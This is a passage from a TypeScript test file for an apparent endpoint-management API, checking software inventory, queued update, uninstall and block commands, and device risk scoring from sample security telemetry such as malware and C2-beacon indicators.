                lastUpdateCheckAt: "2026-04-08T11:59:00Z",
                updateSummary: "Version 7.2.3 is available."
              }
            ]
          })
        }
      ]
    }
  });

  assert.equal(inventoryResponse.statusCode, 200);

  const detailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${enrollment.deviceId}`
  });

  assert.equal(detailResponse.statusCode, 200);
  const detail = detailResponse.json() as {
    device: { lastLoggedOnUser: string | null; privateIpAddresses: string[] };
    installedSoftware: Array<{
      id: string;
      displayName: string;
      blocked: boolean;
      updateState: string;
      updateSummary?: string;
    }>;
  };

  assert.equal(detail.device.lastLoggedOnUser, "CONTOSO\\matt.admin");
  assert.deepEqual(detail.device.privateIpAddresses, ["10.0.10.24", "192.168.1.20"]);
  assert.equal(detail.installedSoftware.length, 1);
  assert.equal(detail.installedSoftware[0].id, "software-001");
  assert.equal(detail.installedSoftware[0].displayName, "Contoso VPN");
  assert.equal(detail.installedSoftware[0].blocked, false);
  assert.equal(detail.installedSoftware[0].updateState, "available");
  assert.match(detail.installedSoftware[0].updateSummary ?? "", /7\.2\.3/);
});

test("software automation routes queue search, update, uninstall, and block commands", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-SOFTWARE",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-SOFTWARE-01"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string };

  const payload = {
    softwareId: "software-002",
    displayName: "Northwind Chat",
    displayVersion: "2.4.0",
    publisher: "Northwind",
    installLocation: "C:\\Program Files\\Northwind Chat",
    uninstallCommand: "msiexec /x {NORTHWIND-CHAT}",
    quietUninstallCommand: "msiexec /x {NORTHWIND-CHAT} /qn",
    executableNames: ["northwind-chat.exe"],
    issuedBy: "qa-operator"
  };

  const searchResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/actions/software-search-updates`,
    headers: harness.adminHeaders,
    payload
  });
  assert.equal(searchResponse.statusCode, 201);
  assert.equal(searchResponse.json().type, "software.update.search");

  const updateResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/actions/software-update`,
    headers: harness.adminHeaders,
    payload
  });
  assert.equal(updateResponse.statusCode, 201);
  assert.equal(updateResponse.json().type, "software.update");

  const uninstallResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/actions/software-uninstall`,
    headers: harness.adminHeaders,
    payload
  });
  assert.equal(uninstallResponse.statusCode, 201);
  assert.equal(uninstallResponse.json().type, "software.uninstall");

  const blockResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/actions/software-block`,
    headers: harness.adminHeaders,
    payload
  });
  assert.equal(blockResponse.statusCode, 201);
  assert.equal(blockResponse.json().type, "software.block");

  const commandsResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/commands?deviceId=${enrollment.deviceId}`
  });

  assert.equal(commandsResponse.statusCode, 200);
  const queuedTypes = (commandsResponse.json().items as Array<{ type: string; issuedBy: string }>).map((item) => item.type);
  assert.deepEqual(queuedTypes.slice(0, 4), [
    "software.block",
    "software.uninstall",
    "software.update",
    "software.update.search"
  ]);
});

test("device risk scoring applies overrides and confidence tracking", () => {
  const score = scoreDeviceRisk({
    deviceId: "risk-unit-001",
    hostname: "EXEC-LAPTOP-UNIT",
    now: "2026-04-08T12:00:00Z",
    telemetry: {
      deviceId: "risk-unit-001",
      hostname: "EXEC-LAPTOP-UNIT",
      updatedAt: "2026-04-08T11:59:00Z",
      source: "unit-test",
      active_malware_count: 2,
      ransomware_behaviour_flag: true,
      c2_beacon_indicator: true,
      edr_enabled: false,
      av_enabled: false,
      firewall_enabled: true,
      tamper_protection_enabled: false,
      local_admin_users_count: 3,
      tacticIds: ["TA0040"],
      techniqueIds: ["T1486"]
    }
  });

  assert.equal(score.riskBand, "critical");
  assert.ok(score.overallScore >= 90);
  assert.ok(score.overrideReasons.some((reason) => /ransomware/i.test(reason)));
  assert.ok(score.overrideReasons.some((reason) => /command-and-control|c2/i.test(reason)));
  assert.ok(score.confidenceScore < 100);
  assert.ok(score.confidenceScore > 0);
  assert.ok(score.missingTelemetryFields.includes("critical_patches_overdue_count"));
  assert.ok(score.missingTelemetryFields.includes("malicious_domain_contacts_7d"));
  assert.ok(score.recommendedActions.some((action) => /isolate|contain/i.test(action)));
});

test("partial derived telemetry still produces non-zero confidence", () => {
  const score = scoreDeviceRisk({
    deviceId: "risk-unit-002",
    hostname: "DERIVED-TELEMETRY-UNIT",
    now: "2026-04-08T12:00:00Z",
    telemetry: {
      deviceId: "risk-unit-002",
      hostname: "DERIVED-TELEMETRY-UNIT",
      updatedAt: "2026-04-08T11:59:00Z",
      source: "fenrir-derived",
      ransomware_behaviour_flag: true,
      lateral_movement_indicator: true,
      c2_beacon_indicator: true,
      edr_enabled: false,
      av_enabled: true,
      firewall_enabled: false,
      tamper_protection_enabled: false,
      standing_admin_present_flag: true,
      pam_enforcement_enabled: true,
      privilege_hardening_mode: "restricted",
      recovery_path_exists: true
    }
  });

  assert.equal(score.riskBand, "critical");
  assert.ok(score.confidenceScore > 0);
  assert.ok(score.missingTelemetryFields.includes("os_patch_age_days"));
  assert.ok(score.missingTelemetryFields.includes("disk_encryption_enabled"));
});

test("device risk telemetry endpoints expose score, history, findings, and summary", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "RISK-ENDPOINT-01",
      osVersion: "Windows 11 24H2",
      serialNumber: "RISK-0001"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };

  const upsertResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/risk-telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      source: "device-risk-agent",
      os_patch_age_days: 61,
      critical_patches_overdue_count: 2,
      known_exploited_vuln_count: 1,
      internet_exposed_unpatched_critical_count: 1,
      unsupported_software_count: 1,
      untrusted_or_unsigned_software_count: 1,
      active_malware_count: 1,
      persistent_threat_count: 1,
      internet_exposed_admin_service_count: 1,
      rdp_exposed_flag: true,
      malicious_domain_contacts_7d: 2,
      c2_beacon_indicator: true,
      av_enabled: false,
      edr_enabled: false,
      firewall_enabled: true,
      disk_encryption_enabled: true,
      tamper_protection_enabled: false,
      risky_signin_indicator: true,
      tacticIds: ["TA0011"],
      techniqueIds: ["T1071"]
    }
  });

  assert.equal(upsertResponse.statusCode, 200);

  const scoreResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${enrollment.deviceId}/score`
  });

  assert.equal(scoreResponse.statusCode, 200);
  const scorePayload = scoreResponse.json() as {
    overallScore: number;
    riskBand: string;
    confidenceScore: number;
    topRiskDrivers: Array<{ title: string }>;
    overrideReasons: string[];
    recommendedActions: string[];
  };
  assert.equal(scorePayload.riskBand, "critical");
  assert.ok(scorePayload.overallScore >= 80);
  assert.ok(scorePayload.confidenceScore > 0);
  assert.ok(scorePayload.topRiskDrivers.length > 0);
  assert.ok(scorePayload.overrideReasons.length > 0);
  assert.ok(scorePayload.recommendedActions.length > 0);

  const historyResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${enrollment.deviceId}/score-history?limit=10`
  });

  assert.equal(historyResponse.statusCode, 200);
  assert.ok((historyResponse.json().items as unknown[]).length >= 1);

  const findingsResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${enrollment.deviceId}/findings`
  });

  assert.equal(findingsResponse.statusCode, 200);
  assert.ok(
    (findingsResponse.json().items as Array<{ title: string }>).some((item) =>
      /malware|admin service|command/i.test(item.title)
    )
  );

  const summaryResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${enrollment.deviceId}/risk-summary`
  });

  assert.equal(summaryResponse.statusCode, 200);
  const summaryPayload = summaryResponse.json() as { summary: string; explanation: string; score: { deviceId: string } };
  assert.match(summaryPayload.summary, /critical risk|risk/i);
  assert.match(summaryPayload.explanation, /recommended actions|override/i);
  assert.equal(summaryPayload.score.deviceId, enrollment.deviceId);

  const recalcResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/score/recalculate`
  });

  assert.equal(recalcResponse.statusCode, 200);
  assert.equal(recalcResponse.json().deviceId, enrollment.deviceId);
});
